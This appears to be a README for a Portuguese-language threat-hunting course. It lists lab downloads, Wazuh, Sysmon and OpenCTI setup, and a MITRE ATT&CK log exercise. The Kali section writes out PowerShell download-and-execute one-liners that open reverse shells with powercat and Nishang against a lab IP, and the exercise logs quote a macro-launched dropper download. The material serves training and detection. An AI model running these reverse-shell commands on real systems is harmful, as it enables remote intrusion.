# THA-ADINT
Repositório de links para o Treinamento Threat Hunting Analist da ADINT School

## Módulo 00

## Download do Virtual Box, Extension Pack, Kali Linux, Metasploitable e ISOS(Windows e Ubuntu)

### VirtualBox Package and Virtual Box Extension Pack
https://www.virtualbox.org/wiki/Downloads

### Kali Download: 
https://www.kali.org/get-kali/#kali-virtual-machines

### Metasploitable:
https://drive.google.com/file/d/1QQwcYOcoKg4zAUEB0xS5urE53H4xWgv_/view?usp=drive_link

### Windows 10:
https://drive.google.com/file/d/12xLX9p-XiLgWqn1eLAse1OUe8QsqScqQ/view?usp=drive_link

### Ubuntu Server: 
https://ubuntu.com/download/server

## Kali Linux
### Atualização
```
$ sudo su
# apt update
# apt upgrade -y
```
### GoPhish
https://github.com/gophish/gophish
```
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git/
$ cd /opt/git
$ git clone https://github.com/gophish/gophish.git
$ cd gophish
$ ls -l
$ sudo apt install golang -y
$ go build
```
### PowerCat
https://github.com/besimorhino/powercat
```
$ mkdir ~/THA/
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
```
### Invoke-PowerShellTCP
https://github.com/samratashok/nishang
```
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
```

## Windows 10

### Habilitar Monitoramento de Logs do PowerShell
1. Ativar Transcrição de Comandos
Crie um script ou use PowerShell para registrar tudo que for digitado:
```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\Logs\PowerShell"
```
Isso criará logs de cada sessão PowerShell em C:\Logs\PowerShell.

2. Habilitar Logging Avançado de ScriptBlock
Esse recurso registra blocos de código malicioso ou suspeito:

```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force 
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```
​
3. Ativar os Canais de Log no Visualizador de Eventos
Abra o PowerShell como administrador e execute:
```
wevtutil set-log "Microsoft-Windows-PowerShell/Operational" /enabled:true
```

### Instalar e Configurar o Sysmon
1. Baixar o Sysmon:
Acesse: Sysinternals Sysmon 
https://learn.microsoft.com/pt-br/sysinternals/downloads/sysmon

• Extraia o conteúdo em:  `C:\Tools\Sysmon`

2. Usar um Arquivo de Configuração Pronto
Você pode usar o modelo do SwiftOnSecurity:
```
curl -o sysmonconfig.xml https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
```

3. Instalar o Sysmon com a Configuração
No prompt de comando como administrador:

```
cd C:\Tools\Sysmon
Sysmon64.exe -accepteula -i sysmonconfig.xml
```

4. Verificar se o Sysmon Está Funcionando
Abra o Visualizador de Eventos e vá até:
```
Aplicativos e Serviços > Microsoft > Windows > Sysmon > Operational
```
Você verá eventos como:

• ID 1 – Criação de processo

• ID 3 – Conexões de rede

• ID 11 – Criação de arquivos


### Office 2013
https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link

## Ubuntu - OpenCTI

### OpenCTI

OpenCTI Docker

https://github.com/OpenCTI-Platform/docker


OpenCTI Documentation - Using Docker


https://docs.opencti.io/latest/deployment/installation/#using-docker


```
$ sudo apt install docker.io
$ sudo apt install docker-compose
$ sudo systemctl start docker
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git
$ cd /opt/git
$ git clone https://github.com/OpenCTI-Platform/docker.git
$ cd docker
$ ls -la
$ uuidgen
$ mv .env.sample .env
$ nano .env
$ sudo docker-compose up
$ sudo docker-compose down
```

Exemplo do meu arquivo .env

```
smith@opencti:/opt/git/docker$ cat .env
OPENCTI_ADMIN_EMAIL=admin@opencti.io
OPENCTI_ADMIN_PASSWORD=changeme
OPENCTI_ADMIN_TOKEN=b2a9b21d-2f06-490d-813d-a704a0715c73
OPENCTI_BASE_URL=http://localhost:8080
OPENCTI_HEALTHCHECK_ACCESS_KEY=changeme
MINIO_ROOT_USER=opencti
MINIO_ROOT_PASSWORD=changeme
RABBITMQ_DEFAULT_USER=opencti
RABBITMQ_DEFAULT_PASS=changeme
CONNECTOR_EXPORT_FILE_STIX_ID=3422c5b9-e469-42c3-b7f4-1246d94ca774
CONNECTOR_EXPORT_FILE_CSV_ID=eac57b4f-504a-492a-818b-381a13055d8b
CONNECTOR_EXPORT_FILE_TXT_ID=25bf3113-1e01-4bba-95f7-5ac46716c7d6
CONNECTOR_IMPORT_FILE_STIX_ID=f79fb019-8ac9-430d-a160-43a60563d5bf
CONNECTOR_IMPORT_DOCUMENT_ID=950f837a-fbf7-46af-bb92-009d27614905
CONNECTOR_ANALYSIS_ID=7fa9af46-1b13-4ad4-badb-02dfd0d3a67d
XTM_COMPOSER_ID=c0378cf9-974a-44b8-a639-72f780ebb8ab
SMTP_HOSTNAME=localhost
ELASTIC_MEMORY_SIZE=4G
COMPOSE_PROJECT_NAME=opencti
smith@opencti:/opt/git/docker$
```

Connectors

https://github.com/OpenCTI-Platform/connectors


Connector MITRE

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/mitre/docker-compose.yml

```
  connector-mitre:
    image: opencti/connector-mitre:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_TOKEN=UUID # gerar para alterar
    restart: always
```

Connector Malwarebazaar

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/malwarebazaar-recent-additions/docker-compose.yml

```
  connector-malwarebazaar-recent-additions:
    image: opencti/connector-malwarebazaar-recent-additions:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - "CONNECTOR_NAME=MalwareBazaar Recent Additions"
      - CONNECTOR_LOG_LEVEL=error
      - MALWAREBAZAAR_RECENT_ADDITIONS_API_URL=https://mb-api.abuse.ch/api/v1/
      - MALWAREBAZAAR_RECENT_ADDITIONS_API_KEY=SUA_API_KEY # gerar para alterar
      - MALWAREBAZAAR_RECENT_ADDITIONS_COOLDOWN_SECONDS=300 # Time to wait in seconds between subsequent requests
      - MALWAREBAZAAR_RECENT_ADDITIONS_INCLUDE_TAGS=exe,dll,docm,docx,doc,xls,xlsx,xlsm,js # (Optional) Only download files if any tag matches. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_INCLUDE_REPORTERS= # (Optional) Only download files uploaded by these reporters. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_LABELS=malware-bazaar # (Optional) Labels to apply to uploaded Artifacts. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_LABELS_COLOR=#54483b # Color to use for labels
    restart: always
```

Alien Vault

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/alienvault/docker-compose.yml


Cadastro necessário para obter a OTX Key (API)

https://otx.alienvault.com/

```
version: '3'
services:
  connector-alienvault:
    image: opencti/connector-alienvault:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - CONNECTOR_NAME=AlienVault
      - CONNECTOR_SCOPE=alienvault
      - CONNECTOR_LOG_LEVEL=error
      - CONNECTOR_DURATION_PERIOD=PT30M # In ISO8601 Format starting with "P" for Period ex: "PT30M" = Period time of 30 minutes
      - ALIENVAULT_BASE_URL=https://otx.alienvault.com
      - ALIENVAULT_API_KEY=SUA_OTX_KEY # gerar para alterar
      - ALIENVAULT_TLP=White
      - ALIENVAULT_CREATE_OBSERVABLES=true
      - ALIENVAULT_CREATE_INDICATORS=true
      - ALIENVAULT_PULSE_START_TIMESTAMP=2022-05-01T00:00:00                  # BEWARE! Could be a lot of pulses!
      - ALIENVAULT_REPORT_TYPE=threat-report
      - ALIENVAULT_REPORT_STATUS=New
      - ALIENVAULT_GUESS_MALWARE=false                                        # Use tags to guess malware.
      - ALIENVAULT_GUESS_CVE=false                                            # Use tags to guess CVE.
      - ALIENVAULT_EXCLUDED_PULSE_INDICATOR_TYPES=FileHash-MD5,FileHash-SHA1  # Excluded Pulse indicator types.
      - ALIENVAULT_ENABLE_RELATIONSHIPS=true                                  # Enable/Disable relationship creation between SDOs.
      - ALIENVAULT_ENABLE_ATTACK_PATTERNS_INDICATES=false                     # Enable/Disable "indicates" relationships between indicators and attack patterns
      - ALIENVAULT_FILTER_INDICATORS=false                                    # Filter indicators by their created datetime
      - ALIENVAULT_INTERVAL_SEC=1800
      - ALIENVAULT_DEFAULT_X_OPENCTI_SCORE=50
      - ALIENVAULT_X_OPENCTI_SCORE_IP=60
      - ALIENVAULT_X_OPENCTI_SCORE_DOMAIN=70
      - ALIENVAULT_X_OPENCTI_SCORE_HOSTNAME=75
      - ALIENVAULT_X_OPENCTI_SCORE_EMAIL=70
      - ALIENVAULT_X_OPENCTI_SCORE_FILE=85
      - ALIENVAULT_X_OPENCTI_SCORE_URL=80
      - ALIENVAULT_X_OPENCTI_SCORE_MUTEX=60
      - ALIENVAULT_X_OPENCTI_SCORE_CRYPTOCURRENCY_WALLET=80
    restart: always
```

Abuse IP DB

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/abuseipdb-ipblacklist/docker-compose.yml

```
  connector-abuseipdb-ipblacklist:
    image: opencti/connector-abuseipdb-ipblacklist:6.8.2
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - "CONNECTOR_NAME=AbuseIPDB IP Blacklist"
      - CONNECTOR_SCOPE=abuseipdb
      - CONNECTOR_LOG_LEVEL=error
      - ABUSEIPDB_URL=https://api.abuseipdb.com/api/v2/blacklist
      - ABUSEIPDB_API_KEY=SUA_API_KEY # gerar para alterar
      - ABUSEIPDB_SCORE=100
      - ABUSEIPDB_LIMIT=1000000
      - ABUSEIPDB_INTERVAL=1 #Day
    restart: always
```

## Ubuntu - Wazuh

## Configuração da rede via netplan
```
root@wazuh:/home/smith# cat /etc/netplan/50-cloud-init.yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses: [192.168.2.165/24]
      routes:
        - to: default
          via: 192.168.2.1
      nameservers:
        addresses: [192.168.2.1]
    enp0s8:
      dhcp4: false
```

### Wazuh Install
https://wazuh.com/install/

### Wazuh Installation guide
https://documentation.wazuh.com/current/installation-guide/index.html

### Instalação do Wazuh 4.7 via script
```
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh --all-in-one --ignore-check --overwrite
```

### Caso apresente problemas na Instalação do Wazuh 4.7 via script

```
1. Parar os serviços
$ sudo systemctl stop wazuh-agent
$ sudo systemctl stop wazuh-manager

2. Desabilitar os serviços (para não iniciarem no boot)
$ sudo systemctl disable wazuh-agent
$ sudo systemctl disable wazuh-manager

3. Remover os serviços do systemd
$ sudo systemctl reset-failed wazuh-agent
$ sudo systemctl reset-failed wazuh-manager

4. Desinstalar pacotes (dependendo da instalação)
$ sudo apt-get remove --purge wazuh-agent wazuh-manager -y
$ sudo apt-get autoremove -y

5. Remover diretórios residuais
$ sudo rm -rf /var/ossec
$ sudo rm -rf /etc/ossec.conf

6. Reiniciar o Ubuntu Server
$ sudo init 6

7. Repetir a instalação
$ curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh --all-in-one --ignore-check --overwrite

```

##  Passos para Configurar Regras no Wazuh
Criar ou editar um arquivo de regras customizadas
• Caminho padrão no Wazuh Manager:
```
/var/ossec/etc/rules/local_rules.xml
```
​
Adicionar regras para eventos do PowerShell
Exemplo de regra para detectar uso do PowerShell:
```
<group name="windows,powershell,">
  <rule id="100100" level="10">
    <if_sid>61610</if_sid>
    <match>powershell.exe</match>
    <description>Execução do PowerShell detectada</description>
  </rule>
</group>
```
​61610 é o SID padrão para eventos de criação de processo no Windows.

Adicionar regras para eventos do Sysmon
Exemplo para detectar criação de processo (Sysmon Event ID 1):
```
<group name="windows,sysmon,">
  <rule id="100200" level="12">
    <if_sid>61610</if_sid>
    <match>EventID=1</match>
    <match>powershell.exe</match>
    <description>Sysmon - Execução de PowerShell detectada</description>
  </rule>
</group>
```
Você pode adaptar para outros eventos:

• ID 3: Conexões de rede

• ID 11: Criação de arquivos

• ID 13: Alterações de registro


Reiniciar o Wazuh Manager
Após salvar as regras:
```
sudo systemctl restart wazuh-manager
```
​
Verificar se as regras estão funcionando
• Use o dashboard do Wazuh ou o arquivo de log:
```
/var/ossec/logs/alerts/alerts.log
```


## 01 Fundamentos de Threat Hunter

### APT28 Fancy Bear
https://en.wikipedia.org/wiki/Fancy_Bear

### O grupo APT28 ataca agências governamentais ucranianas através do Signal usando malware
https://csirt.csi.cip.gov.ua/en/posts/apt28-attacks-ukrainian-government-agencies-via-signal-using-malware

### CTIR Gov - Centro de Prevenção, Tratamento e Resposta a Incidentes Cibernéticos de Governo
https://www.gov.br/ctir/pt-br/assuntos/noticias/2023/ameaca-cibernetica-ativa-emotet-e-trickbot

### app do Google
https://myaccount.google.com/apppasswords

### Teste Web
http://testphp.vulnweb.com/login.php

### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK - Logs
```
1. Log de e-mail (Phishing inicial)
Fonte: Mail Gateway
Timestamp: 2025-10-04T08:15:23Z  
From: hr@secure-docs[.]org  
To: finance.director@targetcorp.com  
Subject: Atualização de política de benefícios 2025  
Attachment: Benefits_Update_2025.doc  
Verdict: Suspicious macro detected

2. Log de execução de macro (Office)
Fonte: Endpoint EDR
Timestamp: 2025-10-04T08:16:02Z  
Host: FINANCE-PC01  
Process: WINWORD.EXE  
Child Process: powershell.exe  
Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"  
Verdict: Malicious PowerShell execution

4. Log de movimentação lateral via SMB
Fonte: Network Sensor (Zeek)
Timestamp: 2025-10-04T08:20:12Z  
Source IP: 10.0.5.21  
Destination IP: 10.0.5.45  
Protocol: SMB  
Action: File transfer – `update.ps1` copied to `\\10.0.5.45\C$\Users\Public\`  
Verdict: Lateral movement suspected

5. Log de exfiltração via HTTP/S
Fonte: Proxy Logs
Timestamp: 2025-10-04T08:25:33Z  
Host: FINANCE-PC01  
Destination: secure-data[.]net  
URL: https://secure-data[.]net/api/upload?session=abc123  
Payload Size: 4.2 MB  
Verdict: Unusual outbound data transfer

6. Log de beaconing (C2)
Fonte: Firewall Logs
Timestamp: 2025-10-04T08:30:00Z  
Source IP: 10.0.5.21  
Destination IP: 182.92.158.231  
Protocol: TCP  
Port: 443  
Frequency: Every 5 minutes  
Verdict: Persistent outbound connection to known APT10 infrastructure
```

### MITRE Navigator
https://mitre-attack.github.io/attack-navigator/

